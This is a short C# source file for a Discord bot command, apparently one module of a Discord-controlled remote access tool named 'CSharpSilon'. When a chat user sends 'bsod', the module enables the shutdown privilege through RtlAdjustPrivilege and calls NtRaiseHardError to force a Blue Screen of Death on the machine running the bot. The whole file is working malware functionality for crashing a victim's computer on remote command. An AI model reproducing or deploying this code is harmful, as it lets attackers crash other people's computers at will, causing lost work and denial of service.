using System;
using Discord.Commands;
using System.Threading.Tasks;

namespace CSharpSilon.cmds
{
    public class Bsod : ModuleBase<SocketCommandContext>
    {
        [Command("bsod"), Summary("Toggle's A BSoD")]
        public async Task BSoD()
        {
            await ReplyAsync("BSoD Starting..");
            bool t1;
            uint t2;
            Utils.App.RtlAdjustPrivilege(19, true, false, out t1);
            Utils.App.NtRaiseHardError(Utils.App.stopCode, 0, 0, IntPtr.Zero, 6, out t2);
            
        }
    }
}